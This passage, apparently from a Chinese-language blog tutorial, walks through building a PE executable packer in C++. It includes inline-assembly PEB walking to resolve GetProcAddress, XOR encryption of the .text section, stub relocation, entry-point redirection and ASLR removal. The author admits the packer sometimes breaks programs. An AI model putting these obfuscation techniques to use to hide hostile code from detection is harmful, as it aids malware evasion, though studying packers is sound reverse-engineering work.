alt="QQ截图20210217145042"></p><p>接下来我们把程序入口点设置给壳区段。<br>使用LORDPE把入口点设为壳区块的虚拟地址</p><p>然后我们用OD打开这个文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145116.png" alt="QQ截图20210217145116"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145128.png" alt="QQ截图20210217145128"></p><h3 id="真正的加壳流程"><a href="#真正的加壳流程" class="headerlink" title="真正的加壳流程"></a>真正的加壳流程</h3><p>刚刚提到的手工加壳，不过是最最基础的加壳原型而已，真正的加壳还涉及了代码加解密等操作.</p><p>真正写壳时一般写两个东西，加壳器和stub<br>所谓加壳器，就是给被加壳文件创造出一个新的区段， 在此同时将程序以某种方式加密，然后把stub放入新区段，并将程序入口点设为新区段的地址，然后在新区段结束后跳转回原程序入口。这个新区段我们叫做壳区段.<br>那么这个stub就是加壳后程序最先执行的命令了，它执行解密算法，将原程序释放出来。</p><h2 id="基于c-的壳编写"><a href="#基于c-的壳编写" class="headerlink" title="基于c++的壳编写"></a>基于c++的壳编写</h2><p>实现了一个薛定谔的加壳器（雾）<br>加壳好的程序有一定几率运行不了，原因未知。。</p><p><a href="https://github.com/ConsT27/PackingEXE/tree/master">https://github.com/ConsT27/PackingEXE/tree/master</a> 👈项目地址</p><p>很大一部分上是借鉴这个老哥的<br><a href="https://github.com/TonyChen56/GuiShou_Pack">https://github.com/TonyChen56/GuiShou_Pack</a></p><p>第一次接触汇编编程，c++编程，上来就是搞这么一个项目，搞了快两个星期，确实有点痛苦，到现在还有很大部分不是很懂的地方（比如许多数据类型以及底层汇编（笑😁<br>这个项目也存在bug，也就是刚刚说的程序有几率不能运行的问题。😡<br>但是也学到了挺多，比如PEB动态寻址，PE文件结构等等。😁<br>苦于网上没有一篇文章详细的交代了技术的细节，所以这篇文章会尽可能的详细。<br>接下来是各个流程的详细实现方法，至于怎么把各个流程链接起来，师傅们可以通过下载上面提到的两个项目来看一下。</p><h3 id="Stub"><a href="#Stub" class="headerlink" title="Stub"></a>Stub</h3><p>stub是被植入到PE文件中的代码，它一般会干下面这些事情。</p><p>流程如下</p><p>0.合并data，rdata到text<br>1.PEB动态寻址，遍历导出表找到GetProcAddress函数<br>2.解密<br>3.修改入口点到原入口点</p><p>同时stub一般以dll的形式存在。原因是DLL通常自带重定位表，这在我们的移植过程中的重定位操作中提供了巨大的便利。</p><h4 id="合并数据段"><a href="#合并数据段" class="headerlink" title="合并数据段"></a>合并数据段</h4><p>我们要移植stub过去，肯定需要移植代码段，也需要移植数据段。不如我们干脆把数据段合并到代码段，一块移植过去。</p><h4 id="PEB动态寻址-amp-导出表遍历找函数"><a href="#PEB动态寻址-amp-导出表遍历找函数" class="headerlink" title="PEB动态寻址&amp;导出表遍历找函数"></a>PEB动态寻址&amp;导出表遍历找函数</h4><p>为什么会用到这个技术编写stub？<br>因为我们的stub.dll植入到宿主程序时，只有.text植入过去，没有对应的导入表，所以我们的stub无法直接调用一些API。所以我们需要动态获取各种API。<br>其中我采用的是PEB动态查询得到GetProcAddress函数，然后用GetProcAddress函数去获取各个API。</p><p>那么，什么是PEB？<br>PEB是一个微软还未完全公开作用的一个结构，它叫做 进程环境信息块 ，包含了进程的信息。其结构如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">  BYTE                          Reserved1[2];</span><br><span class="line">  BYTE                          BeingDebugged; &#x2F;&#x2F;被调试状态</span><br><span class="line">  BYTE                          Reserved2[1];</span><br><span class="line">  PVOID                         Reserved3[2];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr;</span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  BYTE                          Reserved4[104];</span><br><span class="line">  PVOID                         Reserved5[52];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved6[128];</span><br><span class="line">  PVOID                         Reserved7[1];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>我们关心的是PEB偏移0c得到的 PPEB_LDR_DATA Ldr; 它是一个指针，指向一个 PPEB_LDR_DATA 结构， 存放着已经被进程装在的动态链接库的信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _PEB_LDR_DATA</span><br><span class="line">&#123;</span><br><span class="line">　ULONG Length; &#x2F;&#x2F; +0x00</span><br><span class="line">　BOOLEAN Initialized; &#x2F;&#x2F; +0x04</span><br><span class="line">　PVOID SsHandle; &#x2F;&#x2F; +0x08</span><br><span class="line">　LIST_ENTRY InLoadOrderModuleList; &#x2F;&#x2F; +0x0c</span><br><span class="line">　LIST_ENTRY InMemoryOrderModuleList; &#x2F;&#x2F; +0x14</span><br><span class="line">　LIST_ENTRY InInitializationOrderModuleList;&#x2F;&#x2F; +0x1c</span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; &#x2F;&#x2F; +0x24</span><br></pre></td></tr></table></figure><p>PPEB_LDR_DATA 偏移1c是一个指向LIST_ENTRY InInitializationOrderModuleList结构的指针，这个结构 存放着指向模块初始化链表的头 ， 按顺序存放着PE装入运行时初始化模块信息，一般来说第一个链表结点是ntdll.dll,第二个链表结点就是kernel32.dll 。我们就在其中找到kernel32.dll的信息，获取其PE信息，得到导出表，循环遍历得到GetProcAddress函数。<br>另外，PEB地址再TEB偏移0x30处。用汇编语言表示就是 fs:[0x30]。</p><p>以上是PEB寻址的大致流程，另外还有一个比较关键的点是遍历kernel32.dll导出表获得GetProcAddress函数信息。<br>关于导出表可以看看这个文章<a href="https://blog.csdn.net/evileagle/article/details/12176797">https://blog.csdn.net/evileagle/article/details/12176797</a></p><p>首先一个导出表结构体如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;  &#x2F;&#x2F;一般为0，没啥用</span><br><span class="line">    DWORD   TimeDateStamp;  &#x2F;&#x2F;导出表生成的时间</span><br><span class="line">    WORD    MajorVersion;  &#x2F;&#x2F;版本，也是0没啥用</span><br><span class="line">    WORD    MinorVersion;  &#x2F;&#x2F;也是没啥用的版本信息一般为0</span><br><span class="line">    DWORD   Name;  &#x2F;&#x2F;当前导出表的模块名字</span><br><span class="line">    DWORD   Base;  &#x2F;&#x2F;序号表中序号的基数</span><br><span class="line">    DWORD   NumberOfFunctions;  &#x2F;&#x2F;导出函数数量</span><br><span class="line">    DWORD   NumberOfNames;  &#x2F;&#x2F;按名字导出函数的数量</span><br><span class="line">    DWORD   AddressOfFunctions;     &#x2F;&#x2F; 序号表</span><br><span class="line">    DWORD   AddressOfNames;         &#x2F;&#x2F; 名称表</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  &#x2F;&#x2F; 地址表</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>其中序号表的起始序号是Base属性定义的值。以下是导出表的序号名称地址表的关系</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145159.png" alt="QQ截图20210217145159"></p><p>我们的遍历流程是，先遍历名称表找到GetProcAddress在名称数组中的下标，然后根据这个下标去序号数组中找相同下标的序号值，然后以这个序号值为下标去找地址数组中的对应值。我们找到的地址表中的值就是函数入口</p><p>下面我把这段程序的汇编代码放出来。我是用内联汇编把这段代码塞进C++的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GetApis()</span><br><span class="line">&#123;</span><br><span class="line">HMODULE hKernel32;</span><br><span class="line"></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">pushad;</span><br><span class="line">; &#x2F;&#x2F;获取kernel32.dll的加载基址;</span><br><span class="line">mov eax, fs: [0x30] ;  &#x2F;&#x2F;得到PEB地址</span><br><span class="line">mov eax, [eax + 0ch];  &#x2F;&#x2F;获得LDR_PEB_DATA地址</span><br><span class="line">mov eax, [eax + 0ch];  &#x2F;&#x2F;获得LIST_ENTRY InLoadOrderModuleList;地址</span><br><span class="line">mov eax, [eax];  &#x2F;&#x2F;获得LIST_ENTRY InLoadOrderModuleList下一项的地址</span><br><span class="line">mov eax, [eax];  &#x2F;获得LIST_ENTRY InLoadOrderModuleList下下项即我们需要的LIST_ENTRY InInitializationOrderModuleList的地址</span><br><span class="line">mov eax, [eax + 018h]; &#x2F;&#x2F;获得kernel32.dll地址</span><br><span class="line">mov hKernel32, eax;</span><br><span class="line">mov ebx, [eax + 03ch];&#x2F;&#x2F;获得kernel32.dll NT头RVA</span><br><span class="line">add ebx, eax; &#x2F;&#x2F;NT头的VA</span><br><span class="line">add ebx, 078h; &#x2F;&#x2F;获得区段表</span><br><span class="line">mov ebx, [ebx]; &#x2F;&#x2F;获得导出表RVA</span><br><span class="line">add ebx, eax;  &#x2F;&#x2F;导出表VA</span><br><span class="line">lea ecx, [ebx + 020h];  </span><br><span class="line">mov ecx, [ecx]; &#x2F;&#x2F; ecx &#x3D;&gt; 名称表的首地址(rva);</span><br><span class="line">add ecx, eax; &#x2F;&#x2F; ecx &#x3D;&gt; 名称表的首地址(va);</span><br><span class="line">xor edx, edx; &#x2F;&#x2F; 作为索引(index)来使用.</span><br><span class="line">_WHILE:;</span><br><span class="line">mov esi, [ecx + edx * 4];&#x2F;&#x2F;名称数组入口点rva，名称数组单位大小4字节</span><br><span class="line">lea esi, [esi + eax];  &#x2F;&#x2F;入口点VA</span><br><span class="line">cmp dword ptr[esi], 050746547h;   &#x2F;&#x2F;进行名称匹配，050746547h即小端存储的GetP</span><br><span class="line">jne _LOOP;&#x2F;&#x2F;不相等就跳入_LOOP段</span><br><span class="line">cmp dword ptr[esi + 4], 041636f72h; &#x2F;&#x2F;名陈匹配，rocA，以下依次为ddre，ss</span><br><span class="line">jne _LOOP;</span><br><span class="line">cmp dword ptr[esi + 8], 065726464h;</span><br><span class="line">jne _LOOP;</span><br><span class="line">cmp word  ptr[esi + 0ch], 07373h;</span><br><span class="line">jne _LOOP;</span><br><span class="line">mov edi, [ebx + 024h]; </span><br><span class="line">add edi, eax;  &#x2F;&#x2F;获得序号表VA</span><br><span class="line"></span><br><span class="line">mov di, [edi + edx * 2];  &#x2F;&#x2F;获得序号数组中对应下标的地址，序号数组单位大小2字节</span><br><span class="line">and edi, 0FFFFh;  &#x2F;&#x2F;给di提位到32位，即给予edi 序号表中对应下标的地址</span><br><span class="line">mov edx, [ebx + 01ch];  </span><br><span class="line">add edx, eax;  &#x2F;&#x2F;获得地址表</span><br><span class="line">mov edi, [edx + edi * 4];  &#x2F;&#x2F;获得地址数组中，序号对应的值，地址数组单位大小4字节</span><br><span class="line">add edi, eax;   &#x2F;&#x2F;获得GetProcAddress的入口地址</span><br><span class="line">mov MyGetProcAddress, edi;  &#x2F;&#x2F;赋值</span><br><span class="line">jmp _ENDWHILE;  &#x2F;&#x2F;END</span><br><span class="line">_LOOP:;</span><br><span class="line">inc edx; &#x2F;&#x2F; ++index;</span><br><span class="line">jmp _WHILE;</span><br><span class="line">_ENDWHILE:;</span><br><span class="line">popad;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>解密代码段。这段好写。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Decrypt()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char* pText &#x3D; (unsigned char*)g_conf.textScnRVA + 0x400000;&#x2F;&#x2F;锁定到PE文件的text段（因为加壳时去掉了基址随机化，所以自信的把基址填成0x400000</span><br><span class="line"></span><br><span class="line">DWORD old &#x3D; 0;</span><br><span class="line">MyVirtualProtect(pText, g_conf.textScnSize, PAGE_READWRITE, &amp;old);&#x2F;&#x2F;修改代码段的属性,注意我们这里使用了动态获得的</span><br><span class="line">&#x2F;&#x2F;解密代码段</span><br><span class="line">for (DWORD i &#x3D; 0; i &lt; g_conf.textScnSize; i++)</span><br><span class="line">&#123;</span><br><span class="line">pText[i] ^&#x3D; g_conf.key;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;把属性修改回去</span><br><span class="line">MyVirtualProtect(pText, g_conf.textScnSize, old, &amp;old);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="修改入口点"><a href="#修改入口点" class="headerlink" title="修改入口点"></a>修改入口点</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, g_conf.srcOep;  &#x2F;&#x2F;入口点是g_conf.srcOep</span><br><span class="line">add eax, 0x400000</span><br><span class="line">jmp eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="加壳器"><a href="#加壳器" class="headerlink" title="加壳器"></a>加壳器</h3><p>加壳器流程如下</p><p>1.打开需要被加壳的PE文件<br>2.加载stub<br>3.加密代码段<br>4.添加新区段<br>5.stub重定位修复<br>6.stub移植<br>7.PE文件入口点修改<br>8.去随机基址<br>9.保存文件</p><p>以下的各个流程描述中会用到诸多自定义函数，我先贴上来吧。</p><h4 id="诸多自定函数-amp-结构体"><a href="#诸多自定函数-amp-结构体" class="headerlink" title="诸多自定函数&amp;结构体"></a>诸多自定函数&amp;结构体</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;****************</span><br><span class="line">&#x2F;&#x2F;对齐处理</span><br><span class="line">&#x2F;&#x2F;time:2020&#x2F;11&#x2F;5</span><br><span class="line">&#x2F;&#x2F;****************</span><br><span class="line">int AlignMent(_In_ int size, _In_ int alignment) &#123;</span><br><span class="line">return (size) % (alignment)&#x3D;&#x3D;0 ? (size) : ((size) &#x2F; alignment+1) * (alignment);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;***********************</span><br><span class="line">&#x2F;&#x2F;PE信息获取函数簇</span><br><span class="line">&#x2F;&#x2F;time:2020&#x2F;11&#x2F;2</span><br><span class="line">&#x2F;&#x2F;***********************</span><br><span class="line">PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) &#123;</span><br><span class="line">return PIMAGE_DOS_HEADER(pBase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) &#123;</span><br><span class="line">return PIMAGE_NT_HEADERS(GetDosHeader(pBase)-&gt;e_lfanew+(SIZE_T)pBase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) &#123;</span><br><span class="line">return &amp;(GetNtHeader(pBase)-&gt;FileHeader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) &#123;</span><br><span class="line">return &amp;(GetNtHeader(pBase)-&gt;OptionalHeader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER GetLastSec(_In_ char* pBase) &#123;</span><br><span class="line">DWORD SecNum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER FirstSec &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase));</span><br><span class="line">PIMAGE_SECTION_HEADER LastSec &#x3D; FirstSec + SecNum - 1;</span><br><span class="line">return LastSec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase,_In_ const char* name) &#123;</span><br><span class="line">DWORD Secnum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER Section &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase));</span><br><span class="line">char buf[10] &#x3D; &#123; 0 &#125;;</span><br><span class="line">for (DWORD i &#x3D; 0; i &lt; Secnum; i++) &#123;</span><br><span class="line">memcpy_s(buf, 8, (char*)Section[i].Name, 8);</span><br><span class="line">if (!strcmp(buf, name)) &#123;</span><br><span class="line">return Section + i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return nullptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef struct _StubConf</span><br><span class="line">&#123;</span><br><span class="line">DWORD srcOep;&#x2F;&#x2F;入口点</span><br><span class="line">DWORD textScnRVA;&#x2F;&#x2F;代码段RVA</span><br><span class="line">DWORD textScnSize;&#x2F;&#x2F;代码段的大小</span><br><span class="line">DWORD key;&#x2F;&#x2F;解密密钥</span><br><span class="line">&#125;StubConf;</span><br><span class="line"></span><br><span class="line">struct StubInfo</span><br><span class="line">&#123;</span><br><span class="line">char* dllbase;&#x2F;&#x2F;stub.dll的加载基址</span><br><span class="line">DWORD pfnStart;&#x2F;&#x2F;stub.dll(start)导出函数的地址</span><br><span class="line">StubConf* pStubConf;&#x2F;&#x2F;stub.dll(g_conf)导出全局变量的地址</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="打开PE文件"><a href="#打开PE文件" class="headerlink" title="打开PE文件"></a>打开PE文件</h4><p>这里采用的方法是利用CreateFileA函数。同时这个函数还抛出了一个指向PE文件大小的指针</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char* GetFileHmoudle(_In_ const char* path,_Out_opt_ DWORD* nFileSize) &#123;</span><br><span class="line">&#x2F;&#x2F;打开一个文件并获得文件句柄</span><br><span class="line">HANDLE hFile &#x3D; CreateFileA(path,</span><br><span class="line">GENERIC_READ,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line">NULL,</span><br><span class="line">OPEN_ALWAYS,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">NULL);</span><br><span class="line">&#x2F;&#x2F;获得文件大小</span><br><span class="line">DWORD FileSize &#x3D; GetFileSize(hFile, NULL);</span><br><span class="line">&#x2F;&#x2F;返回文件大小到变量nFileSize</span><br><span class="line">if(nFileSize)</span><br><span class="line">*nFileSize &#x3D; FileSize;</span><br><span class="line">&#x2F;&#x2F;申请一片大小为FileSize的内存并将指针置于首位</span><br><span class="line">char* pFileBuf &#x3D; new CHAR[FileSize]&#123; 0 &#125;;</span><br><span class="line">&#x2F;&#x2F;给刚刚申请的内存读入数据</span><br><span class="line">DWORD dwRead;</span><br><span class="line">ReadFile(hFile, pFileBuf, FileSize, &amp;dwRead, NULL);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">return pFileBuf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="加载STUB"><a href="#加载STUB" class="headerlink" title="加载STUB"></a>加载STUB</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void LoadStub(_In_ StubInfo* pstub) &#123;</span><br><span class="line">pstub-&gt;dllbase &#x3D; (char*)LoadLibraryEx(L&quot;F:\\stubdll.dll&quot;, NULL, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class="line">pstub-&gt;pfnStart &#x3D; (DWORD)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;Start&quot;);  &#x2F;&#x2F;获得stub的入口函数Start(自己定义在stub中的一个函数</span><br><span class="line">pstub-&gt;pStubConf &#x3D; (StubConf*)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;g_conf&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;不仅加载了stub，还获得了stub抛出的用于收集信息的全局结构体（g_conf,是一个stub抛出的结构体，用于获取信息，结构如下）</span><br><span class="line">typedef struct _StubConf</span><br><span class="line">&#123;</span><br><span class="line">DWORD srcOep;&#x2F;&#x2F;入口点</span><br><span class="line">DWORD textScnRVA;&#x2F;&#x2F;代码段RVA</span><br><span class="line">DWORD textScnSize;&#x2F;&#x2F;代码段的大小</span><br><span class="line">DWORD key;&#x2F;&#x2F;解密密钥</span><br><span class="line">&#125;StubConf;</span><br></pre></td></tr></table></figure><h4 id="加密代码段"><a href="#加密代码段" class="headerlink" title="加密代码段"></a>加密代码段</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD textRVA &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;VirtualAddress;</span><br><span class="line">DWORD textSize &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;Misc.VirtualSize;</span><br><span class="line">Encry(PeHmoudle,pstub);</span><br><span class="line">void Encry(_In_ char* hpe,_In_ StubInfo pstub) &#123;</span><br><span class="line">&#x2F;&#x2F;获取代码段首地址</span><br><span class="line">BYTE* TargetText &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;PointerToRawData + (BYTE*)hpe;</span><br><span class="line">&#x2F;&#x2F;获取代码段大小</span><br><span class="line">DWORD TargetTextSize &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;Misc.VirtualSize;</span><br><span class="line">&#x2F;&#x2F;加密代码段</span><br><span class="line">for (int i &#x3D; 0; i &lt; TargetTextSize; i++) &#123;</span><br><span class="line">TargetText[i] ^&#x3D; 0x15;</span><br><span class="line">&#125;</span><br><span class="line">pstub.pStubConf-&gt;textScnRVA &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;VirtualAddress;</span><br><span class="line">pstub.pStubConf-&gt;textScnSize &#x3D; TargetTextSize;</span><br><span class="line">pstub.pStubConf-&gt;key &#x3D; 0x15;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;加密代码段，并给予了stub一些信息</span><br></pre></td></tr></table></figure><h4 id="添加新区段"><a href="#添加新区段" class="headerlink" title="添加新区段"></a>添加新区段</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char* AddSec(_In_ char*&amp; hpe, _In_ DWORD&amp; filesize, _In_ const char* secname, _In_ const int secsize) &#123;</span><br><span class="line">GetFileHeader(hpe)-&gt;NumberOfSections++;</span><br><span class="line">PIMAGE_SECTION_HEADER pesec &#x3D; GetLastSec(hpe);</span><br><span class="line">&#x2F;&#x2F;设置区段表属性</span><br><span class="line">memcpy(pesec-&gt;Name, secname, 8);</span><br><span class="line">pesec-&gt;Misc.VirtualSize &#x3D; secsize;</span><br><span class="line">pesec-&gt;VirtualAddress &#x3D; (pesec - 1)-&gt;VirtualAddress + AlignMent((pesec - 1)-&gt;SizeOfRawData,GetOptHeader(hpe)-&gt;SectionAlignment);</span><br><span class="line">pesec-&gt;SizeOfRawData &#x3D; AlignMent(secsize, GetOptHeader(hpe)-&gt;FileAlignment);</span><br><span class="line">pesec-&gt;PointerToRawData &#x3D; AlignMent(filesize,GetOptHeader(hpe)-&gt;FileAlignment);</span><br><span class="line">pesec-&gt;Characteristics &#x3D; 0xE00000E0;</span><br><span class="line">&#x2F;&#x2F;设置OPT头映像大小</span><br><span class="line">GetOptHeader(hpe)-&gt;SizeOfImage &#x3D; pesec-&gt;VirtualAddress + pesec-&gt;SizeOfRawData;</span><br><span class="line">&#x2F;&#x2F;扩充文件数据</span><br><span class="line">int newSize &#x3D; pesec-&gt;PointerToRawData + pesec-&gt;SizeOfRawData;</span><br><span class="line">char* nhpe &#x3D; new char [newSize] &#123;0&#125;;</span><br><span class="line">&#x2F;&#x2F;向新缓冲区录入数据</span><br><span class="line">memcpy(nhpe, hpe, filesize);</span><br><span class="line">&#x2F;&#x2F;缓存区更替</span><br><span class="line">delete hpe;</span><br><span class="line">filesize &#x3D; newSize;</span><br><span class="line">return nhpe;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stub重定位"><a href="#stub重定位" class="headerlink" title="stub重定位"></a>stub重定位</h4><p>好家伙，这个东西稍有不慎就会让整个程序拉跨掉（过来人的忠告<br>为什么需要stub重定位呢？因为我们的stub最开始是加载在内存中的，它的许多指令如跳转到的地址是按内存为基准确定的，但是我们需要把他移植进文件，所以它的代码里许多地址就是错误的，我们需要对这些地址进行处理，即重定位，使其以宿主程序为标准进行地址修复。<br>可能我表述的不是很清楚😥举个例子吧，比如stub在加载进内存时，有一条跳转指令时jmp 12345678, 如果我们不处理就把这条指令移植进PE文件，那么PE文件执行到此处时就会跳转到12345678，此时的12345678地址可能就已经不是PE文件加载的内存区间了，从而程序会崩溃。所以要修复。根据stub的重定位表进行修复。<br>重定位表就是记录哪些地址的数据需要被修复的，我们遍历这些地址进行修复即可。<br>如果以下代码看起来吃力，可以先去了解一下重定位表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void FixStub(DWORD targetDllbase, DWORD stubDllbase,DWORD targetNewScnRva,DWORD stubTextRva )</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;找到stub.dll的重定位表</span><br><span class="line">DWORD dwRelRva &#x3D; GetOptHeader((char*)stubDllbase)-&gt;DataDirectory[5].VirtualAddress;</span><br><span class="line">IMAGE_BASE_RELOCATION* pRel &#x3D; (IMAGE_BASE_RELOCATION*)(dwRelRva + stubDllbase);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;遍历重定位表</span><br><span class="line">while (pRel-&gt;SizeOfBlock)</span><br><span class="line">&#123;</span><br><span class="line">struct TypeOffset</span><br><span class="line">&#123;</span><br><span class="line">WORD offset : 12;</span><br><span class="line">WORD type : 4;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">TypeOffset* pTypeOffset &#x3D; (TypeOffset*)(pRel + 1);</span><br><span class="line">DWORD dwCount &#x3D; (pRel-&gt;SizeOfBlock - 8) &#x2F; 2;&#x2F;&#x2F;需要重定位的数量</span><br><span class="line">for (int i &#x3D; 0; i &lt; dwCount; i++)</span><br><span class="line">&#123;</span><br><span class="line">if (pTypeOffset[i].type !&#x3D; 3)</span><br><span class="line">&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;需要重定位的地址</span><br><span class="line">DWORD* pFixAddr &#x3D; (DWORD*)(pRel-&gt;VirtualAddress + pTypeOffset[i].offset + stubDllbase);</span><br><span class="line"></span><br><span class="line">DWORD dwOld;</span><br><span class="line">&#x2F;&#x2F;修改属性为可写</span><br><span class="line">VirtualProtect(pFixAddr, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">&#x2F;&#x2F;去掉dll当前加载基址</span><br><span class="line">*pFixAddr -&#x3D; stubDllbase;</span><br><span class="line">&#x2F;&#x2F;去掉默认的段首RVA</span><br><span class="line">*pFixAddr -&#x3D; stubTextRva;</span><br><span class="line">&#x2F;&#x2F;换上目标文件的加载基址</span><br><span class="line">*pFixAddr +&#x3D; targetDllbase;</span><br><span class="line">&#x2F;&#x2F;加上新区段的段首RVA</span><br><span class="line">*pFixAddr +&#x3D; targetNewScnRva;</span><br><span class="line">&#x2F;&#x2F;把属性修改回去</span><br><span class="line">VirtualProtect(pFixAddr, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;切换到下一个重定位块</span><br><span class="line">pRel &#x3D; (IMAGE_BASE_RELOCATION*)((DWORD)pRel + pRel-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stub移植"><a href="#stub移植" class="headerlink" title="stub移植"></a>stub移植</h4><p>这个简单，没啥说的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memcpy(GetLastSec(PeNewHmoudle)-&gt;PointerToRawData+ PeNewHmoudle,</span><br><span class="line">GetSecByName(pstub.dllbase, &quot;.text&quot;)-&gt;VirtualAddress+pstub.dllbase,</span><br><span class="line">GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;Misc.VirtualSize);</span><br></pre></td></tr></table></figure><h4 id="入口点修改"><a href="#入口点修改" class="headerlink" title="入口点修改"></a>入口点修改</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GetOptHeader(PeNewHmoudle)-&gt;AddressOfEntryPoint &#x3D;</span><br><span class="line">pstub.pfnStart-(DWORD)pstub.dllbase-GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;VirtualAddress+GetLastSec(PeNewHmoudle)-&gt;VirtualAddress;</span><br></pre></td></tr></table></figure><h4 id="去随机基址"><a href="#去随机基址" class="headerlink" title="去随机基址"></a>去随机基址</h4><p>不去掉随机基址，加载基址就是不固定的，不方便操作</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GetOptHeader(PeNewHmoudle)-&gt;DllCharacteristics &amp;&#x3D; (~0x40);</span><br></pre></td></tr></table></figure><h4 id="保存文件"><a href="#保存文件" class="headerlink" title="保存文件"></a>保存文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) &#123;</span><br><span class="line">HANDLE hFile &#x3D; CreateFileA(</span><br><span class="line">path,</span><br><span class="line">GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line">NULL,</span><br><span class="line">CREATE_ALWAYS,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">NULL</span><br><span class="line">);</span><br><span class="line">DWORD Buf &#x3D; 0;</span><br><span class="line">WriteFile(hFile, data, FileSize, &amp;Buf,NULL);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" 